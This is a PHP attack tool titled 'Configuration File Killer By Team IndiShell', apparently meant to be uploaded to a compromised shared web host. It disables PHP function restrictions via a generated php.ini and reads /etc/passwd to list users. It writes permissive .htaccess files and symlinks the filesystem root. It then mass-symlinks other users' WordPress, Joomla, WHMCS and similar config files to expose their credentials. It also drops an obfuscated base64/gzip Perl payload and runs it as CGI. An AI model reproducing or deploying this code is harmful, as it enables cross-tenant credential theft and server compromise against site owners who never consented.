<?php


 $head = '
<html>
<head>
</script>
<title>--==[[Configuration File Killer By Team IndiShell]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border    		: solid 3px ;
border-color		: #333;
BACKGROUND-COLOR: white;
font: 11pt Verdana;
color: #333;
}
select {
BORDER-RIGHT:  Black 1px solid;
BORDER-TOP:    #DF0000 1px solid;
BORDER-LEFT:   #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border			: dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin			: -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
	COLOR: White; TEXT-DECORATION: none
}
A:visited {
	COLOR: White; TEXT-DECORATION: none
}
A:hover {
	color: Red; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>'; ?>
<html>
	<head>
		<?php 
		echo $head ;
		echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >

			

       <td width="100%" align=center valign="top" rowspan="1">
           <font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ Configuration</font><font color=white size=5 face="comic sans ms"><b>  File Killer By</font><font color=green size=5 face="comic sans ms"><b> Team IndiShell ]]==--</font> <div class="hedr"> 

        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1"><font 
        color="red" face="comic sans ms"size="1"><b> 
        <font color=#ff9933> 
        ####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font><br><font color=white>-==[[Greetz to]]==--</font><br> <font color=#ff9933>   Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba ,Silent poison India,Magnum sniper,Atul Dwivedi,ethicalnoob Indishell,Local root indishell,Irfninja indishell<br>cool toad,cool shavik, Ebin V Thomas,Dinelson Amine ,Mr. Trojan,rad paul,Godzila,mike waals,Neo hacker ICA, Golden boy INDIA,Ketan Singh,Yash,Reborn India,Alicks,Aneesh Dogra,silent hacker,lovetherisk<br>Suriya Prakash,cyber gladiator,Cyber Ace,hero,Minhal Mehdi ,Raj bhai ji,cold fire hacker,Mannu, ViKi ,Budhaoo, Bhuppi,Mohit, Ffe ^_^,Ashish,Shardhanand and rest of TEAM INDISHELL<br>

<font color=white>--==[[Dedicated to]]==--</font>
<br># My Father and my Ex Teacher  #<br><font color=white>--==[[Interface Desgined By]]==--</font><br><font color=red>GCE College ke DON :D</font><br><font color=#ff9933> 
        ####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font>
						
           </table>
       </table> <div align=center><font color=#ff9933 font size=5><marquee behavior="scroll" direction="left" scrollamount="2" scrolldelay="30" width="70%"><span class="footerlink">love happen only once.....Rest is life......</span></marquee><br></font></div><div align=center><table><tr><td>Welcome Bhai ji :) .. Configuration file killer welcomes you _/\_ </font><br></td></tr></table>

'; 

?>
<body bgcolor=black><h3 style="text-align:center"><font color=red size=2 face="comic sans ms">
<form method=post><font color=white size=2 face="comic sans ms">The button given below generates php.ini file :)</font><br>
<input type=submit name=ini value="use to Generate PHP.ini" /></form>
<?php
	if(isset($_POST['ini']))
	{
		
		$r=fopen('php.ini','w');
		$rr=" disable_functions=none ";
		fwrite($r,$rr);
		$link="<a href=php.ini><font color=white size=2 face=\"comic sans ms\"><u>open this link in new tab to run PHP.INI</u></font></a>";
		echo $link;
		
		}
	
	
	
	?>
<div align=center><table width=100% border=1><tr><td align=center></td></tr></table>
<form method=post>
<font color=white size=2 face="comic sans ms">manual symlink<br><input type=submit name=man value="Open Manual symlink form"><p></form>
	<?php
	if(isset($_POST['man']))
{	
?>
<form method=post>file link that you want symlink:-<input type=text name=dli value="/home/user/public_html/config.php">&nbsp file name with  which you want represent symlink :-<input type=text name=fna value="owned.txt"><br>use .txt(owned.txt) or no extension(owned)  for file which will represent symlink<br><br><input type=submit name=manual value="maar le >.<"></form>
<?php	
}	
	?>
	<?php
	error_reporting(0);
	if(isset($_POST['manual']))
	{
	$dlink=trim($_POST['dli']);
     $fna=trim($_POST['fna']);
     mkdir('ICA',0777);
	$acc = " Options all \n DirectoryIndex ICA.html  \n Require None \n Satisfy Any";
$ha = fopen('ICA/.htaccess','w');
fwrite($ha,$acc);
$final="ICA/".$fna;
symlink($dlink,$final);
     
echo "<br>bhaiyu maine ".$dlink." ko jahaan symlink kiya, uska link==> <a href=".$final."><font color=red size=3>is here</font></a>";
}
	?><p><div align=center><table width=100% border=1><tr><td align=center></td></tr></table>
<font color=white size=2 face="comic sans ms">automated mass symlink wala jugaad xD</font>
<form method=post>
	<input type=submit name="usre" value="use to Extract usernames" /></form>
	
	
	
	
	<?php
	if(isset($_POST['usre'])){
		?><form method=post>
	<textarea rows=10 cols=50 name=user><?php  $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><br><br>
	<input type=submit name=su value="bhaiyu ^_^ .. lets start" /></form>
	<?php } ?>
	<?php
	error_reporting(0);
	echo "<font color=red size=2 face=\"comic sans ms\">";
	if(isset($_POST['su']))
	{
	mkdir('Indishell',0777);
$rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$g = fopen('Indishell/.htaccess','w');
fwrite($g,$rr);
$indishell = symlink("/","Indishell/root");
		    $rt="<a href=Indishell/root><font color=white size=3 face=\"comic sans ms\"> OwN3d</font></a>";
        echo "Bhai ji .... check link given below for / folder symlink <br><u>$rt</u>";
		
		$dir=mkdir('INDISHELL',0777);
		$r  = " Options all \n DirectoryIndex ICA.html  \n   Require None \n Satisfy Any";
        $f = fopen('INDISHELL/.htaccess','w');
   
        fwrite($f,$r);
        $consym="<a href=INDISHELL/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
       	echo "<br>The link given below for configuration file symlink...open it, once processing finish <br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";
       	
       		$usr=explode("\n",$_POST['user']);
       	
		foreach($usr as $uss )
		{
			$us=trim($uss);
						
			$r="INDISHELL/";
			 symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
			 symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
			  symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
			   symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
			    symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
				 symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
				  symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
				   symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
				    symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
					 symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
					  symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
					   symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
					  symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
					   symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
					  symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
					   symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
					  symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
					   symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
					  symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
					   symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
					  symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
					   symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
					  symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
					   symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
					  symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
					   symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
						}
				}
	?>
<div align=center><table width=100% border=1><tr><td align=center></td></tr></table>

<font color=white size=4 face="comic sans ms">for Perl based symlink ;)<br><form method=post>
	<input type=submit name=passx value="cat /etc/passwd"><p></form>
	<?php
if(isset($_POST['passx']))
{
	?>
<textarea style="background:black;color:white" rows=20 cols=50 name=usernames  ><?php  $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode("\n",$user);
echo $str[0]."\n";
}

?></textarea>
<?php 
}



?>

	
	<form method=post>

	<font size=5 color=white>--==[[ <input type=submit name=perl value="Perl based  ln -s \m/"> ]]==--</font></form>
	<p>

	
	
	
	
	<?php
if(isset($_POST['perl']))
{
	error_reporting(0);

$da='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';
$decryp=gzinflate(base64_decode($da));
mkdir('perl', 0777);
$hope = fopen("perl/.htaccess", 'w');
$hcon= "Options FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .root\nAddHandler cgi-script .root\nAddHandler cgi-script .root"; 
fwrite ( $hope, $hcon ) ;
$pelfile = fopen("perl/in.root" ,"w");
fwrite ($pelfile,$decryp);
    chmod("perl/in.root",0755);
   echo "<iframe src=perl/in.root width=50% height=70% ></iframe><br><br> ";
   echo "<font size=4>check in this directory for configuration files once you have done with this script<br><a href=perl/><u>yahaan bhai ji yahaan :)</u></a></font>";

}
?>
<table width=100% border=1><tr><td align=center></td></tr></table>
<font color=#ff9933 size=4>--==[[ Cant read /etc/named.conf bypasser ]]==--</font>

<form method=post>
	<input type=submit name="ms" value="for what you are waiting o.O" /></form>
	
	
	<?php
	if(isset($_POST['ms']))
	{
		error_reporting(0);
		$cmd="ls /var/named";
		$r=shell_exec($cmd);
		

		mkdir('INDIshell',0777);




$rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$f = fopen('INDIshell/.htaccess','w');

$indishell = symlink("/","INDIshell/root");

fwrite($f , $rr);
		?><form method=post><textarea rows=1 cols=1 name=web><?php echo $r;?></textarea><br><input type=submit name=w value="one more time bhaiyu ^_^ " />
		</form>
		<?php
		
		}
	
error_reporting(0);
$webs=explode("\n",$_POST['web']);
if(isset($_POST['w']))
{
$webs=explode("\n",$_POST['web']);
echo "<table width=40% align=center border=1>
<tr><td align=center>Websites</td><td align=center>usernames</td><td>symlink</td></tr>";
foreach($webs as $f)
{
	$str=substr_replace($f,"",-4);
	

$user = posix_getpwuid(@fileowner("/etc/valiases/".$str));

echo "<table border=1 width=40%><tr><td align=center><font color=red>".$str."</font></td><td align=center><font color=white>".$user['name']."</td><td><a href=INDIshell/root/home/".$user['name']."/public_html/>spin the shit XD</a></tr></table>"; flush();


	
	
	
	}	
	
	}


?>